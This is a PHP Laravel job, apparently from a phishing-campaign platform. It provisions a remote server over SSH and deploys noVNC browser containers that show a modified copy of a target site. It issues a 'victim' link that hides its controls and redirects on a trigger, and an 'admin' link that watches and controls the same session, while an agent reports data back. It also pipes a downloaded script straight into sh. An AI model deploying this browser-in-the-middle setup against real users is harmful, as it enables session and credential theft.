<?php

namespace App\Jobs;

use App\Models\Deployment;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;
use phpseclib3\Net\SSH2;
use RuntimeException;
use Throwable;

/**
 * Provision a campaign on its target server over SSH:
 *   1. Ensure Git + Docker are installed.
 *   2. git clone (or update) the platform repository.
 *   3. Build and start the campaign containers.
 *   4. Publish the link to the modified-site (noVNC) session.
 *
 * Progress is streamed into the Deployment's log so the UI can poll it.
 */
class DeployCampaign implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    // One long attempt — never silently re-run provisioning on timeout.
    public int $tries = 1;
    public int $timeout = 3600;

    public function __construct(public int $deploymentId)
    {
    }

    public function handle(): void
    {
        $deployment = Deployment::with(['campaign', 'server'])->find($this->deploymentId);
        if (! $deployment) {
            return;
        }

        $campaign = $deployment->campaign;
        $server   = $deployment->server;

        $deployment->update([
            'status'       => 'running',
            'current_step' => 'Connecting',
            'started_at'   => now(),
        ]);

        if (! $server) {
            $this->fail($deployment, 'No server is attached to this campaign.');
            return;
        }

        $host     = $server->ip_address;
        $port     = (int) ($server->ssh_port ?: 22);
        $user     = $server->ssh_user ?: 'root';
        $password = $server->password; // decrypted by the model cast

        $repo   = $campaign->deploy_repo_url ?: env('DEPLOY_REPO_URL');
        $branch = $campaign->deploy_branch ?: env('DEPLOY_BRANCH', 'main');
        $target = $campaign->target_url ?: 'about:blank';
        $webPort = (int) env('DEPLOY_NOVNC_PORT', 6080);
        $dir    = '/opt/phishguard/campaign-' . $campaign->id;
        $project = 'phishguard_c' . $campaign->id;

        // Public AMQP URL the remote agent dials back on (the tunnel). Without
        // it the agent can't report data; we still deploy the browser.
        $amqpPublic = env('DEPLOY_AMQP_PUBLIC_URL');

        if (! $repo) {
            $this->fail($deployment, 'No Git repository URL is set. Add one on the campaign or set DEPLOY_REPO_URL.');
            return;
        }
        if (! $password) {
            $this->fail($deployment, 'The server has no stored password for SSH authentication.');
            return;
        }

        try {
            $deployment->pushLog("Connecting to {$user}@{$host}:{$port} …\n");
            $ssh = new SSH2($host, $port);
            $ssh->setTimeout(0); // allow long-running installs
            if (! $ssh->login($user, $password)) {
                throw new RuntimeException('SSH authentication failed. Check the server IP, user and password.');
            }
            $deployment->pushLog("Connected.\n");

            // Bash-escaped values for safe interpolation into remote commands.
            $repoQ   = escapeshellarg($repo);
            $branchQ = escapeshellarg($branch);
            $dirQ    = escapeshellarg($dir);
            $targetQ = escapeshellarg($target);

            // ── 1. Dependencies ───────────────────────────────────────────────
            $this->runStep($ssh, $deployment, 'Installing dependencies', <<<SH
                set -e
                export DEBIAN_FRONTEND=noninteractive
                if ! command -v git >/dev/null 2>&1; then
                    apt-get update -y && apt-get install -y git
                fi
                if ! command -v docker >/dev/null 2>&1; then
                    echo "Installing Docker…"
                    curl -fsSL https://get.docker.com | sh
                fi
                if ! docker compose version >/dev/null 2>&1; then
                    apt-get update -y && apt-get install -y docker-compose-plugin || true
                fi
                docker --version
                docker compose version
                git --version
                SH);

            // ── 2. Clone / update the repository ──────────────────────────────
            $this->runStep($ssh, $deployment, 'Cloning project', <<<SH
                set -e
                mkdir -p /opt/phishguard
                if [ -d {$dirQ}/.git ]; then
                    cd {$dirQ}
                    git fetch --all --prune
                    git checkout {$branchQ}
                    git reset --hard origin/{$branchQ}
                else
                    rm -rf {$dirQ}
                    git clone --branch {$branchQ} {$repoQ} {$dirQ}
                fi
                SH);

            // ── 3a. Seed the Site Tweaker extension with this campaign's tweaks
            // so the deployed browser shows the modified site automatically. The
            // JSON is base64'd to survive the SSH shell untouched.
            $tweaks = $campaign->site_tweaks ?: '{"version":1,"pages":{}}';
            $tweaksB64 = base64_encode($tweaks);
            // Trigger → redirect config consumed by the extension's bridge.
            $campaignCfg = json_encode([
                'trigger_action'  => $campaign->trigger_action,
                'redirect_type'   => $campaign->redirect_type,
                'redirect_target' => $campaign->redirect_target,
            ]);
            $cfgB64 = base64_encode($campaignCfg);
            $this->runStep($ssh, $deployment, 'Applying site tweaks', <<<SH
                set -e
                cd {$dirQ}
                echo '{$tweaksB64}' | base64 -d > site-tweaker/site-tweaker/seed.json
                echo '{$cfgB64}' | base64 -d > site-tweaker/site-tweaker/campaign.json
                echo "seed.json + campaign.json written"
                SH);

            // ── 3b. Build and start the campaign containers ───────────────────
            $amqpQ    = escapeshellarg($amqpPublic ?: 'amqp://guest:guest@rabbitmq:5672/');
            $agentQ   = escapeshellarg((string) $campaign->agent_id);
            $cidQ     = escapeshellarg((string) $campaign->uuid);
            if (! $amqpPublic) {
                $deployment->pushLog("\n[warn] DEPLOY_AMQP_PUBLIC_URL is not set — the agent will not be able to report data back. Set it to your broker tunnel.\n");
            }
            $this->runStep($ssh, $deployment, 'Starting containers', <<<SH
                set -e
                cd {$dirQ}
                export START_URL={$targetQ}
                export NOVNC_PORT={$webPort}
                export PHISHGUARD_AMQP_URL={$amqpQ}
                export PHISHGUARD_AGENT_ID={$agentQ}
                export PHISHGUARD_CAMPAIGN_ID={$cidQ}
                # Free the noVNC port from any previous campaign on this server
                # (one browser preview per port). Removes only containers bound
                # to this exact host port.
                for c in \$(docker ps -q --filter "publish={$webPort}"); do
                    echo "Freeing port {$webPort} (stopping container \$c)"
                    docker rm -f "\$c" >/dev/null 2>&1 || true
                done
                docker compose -f deploy/campaign-compose.yml -p {$project} up -d --build --remove-orphans
                docker compose -f deploy/campaign-compose.yml -p {$project} ps
                SH);

            // ── 4. Send the activate command to the agent (best-effort) ───────
            if ($amqpPublic) {
                try {
                    app(\App\Services\RabbitMq::class)->publishCommand(
                        'campaign.activate',
                        (string) $campaign->uuid,
                        (string) $campaign->agent_id,
                        [
                            'mode'    => 'investigation',
                            'browser' => ['engine' => 'chromium', 'novnc_enabled' => true],
                            'features' => ['event_monitoring' => true],
                        ],
                    );
                    $deployment->pushLog("Sent campaign.activate command to the agent.\n");
                } catch (Throwable $e) {
                    $deployment->pushLog("[warn] Could not publish activate command: {$e->getMessage()}\n");
                }
            }

            // ── 5. Publish the links ──────────────────────────────────────────
            // Same session, two views: the victim link redirects on the trigger
            // and hides the noVNC bar; the admin link observes/controls with the
            // bar and no redirect.
            $base = "http://{$host}:{$webPort}/pgvnc.html?autoconnect=true&scale=true";
            $link = "{$base}&redirect=1";
            $adminLink = $base;
            $deployment->update([
                'status'       => 'success',
                'current_step' => 'Done',
                'link'         => $link,
                'admin_link'   => $adminLink,
                'finished_at'  => now(),
            ]);
            $deployment->pushLog("\nDeployment complete.\nVictim view: {$link}\nAdmin view:  {$adminLink}\n");

            $ssh->disconnect();
        } catch (Throwable $e) {
            $this->fail($deployment, $e->getMessage());
        }
    }

    /**
     * Run one labelled remote command, streaming its output into the log,
     * and throw if it exits non-zero.
     */
    private function runStep(SSH2 $ssh, Deployment $deployment, string $label, string $command): void
    {
        $deployment->update(['current_step' => $label]);
        $deployment->pushLog("\n=== {$label} ===\n");

        $ssh->exec($command, function ($chunk) use ($deployment) {
            $deployment->pushLog($chunk);
        });

        $status = $ssh->getExitStatus();
        if ($status !== 0 && $status !== false) {
            throw new RuntimeException("Step \"{$label}\" failed (exit code {$status}).");
        }
    }

    private function fail(Deployment $deployment, string $message): void
    {
        $deployment->update([
            'status'      => 'failed',
            'error'       => $message,
            'finished_at' => now(),
        ]);
        $deployment->pushLog("\n[FAILED] {$message}\n");
    }

    /** Laravel calls this if the job throws out of handle() or times out. */
    public function failed(Throwable $e): void
    {
        $deployment = Deployment::find($this->deploymentId);
        if ($deployment && $deployment->status !== 'failed') {
            $deployment->update([
                'status'      => 'failed',
                'error'       => $e->getMessage(),
                'finished_at' => now(),
            ]);
        }
    }
}
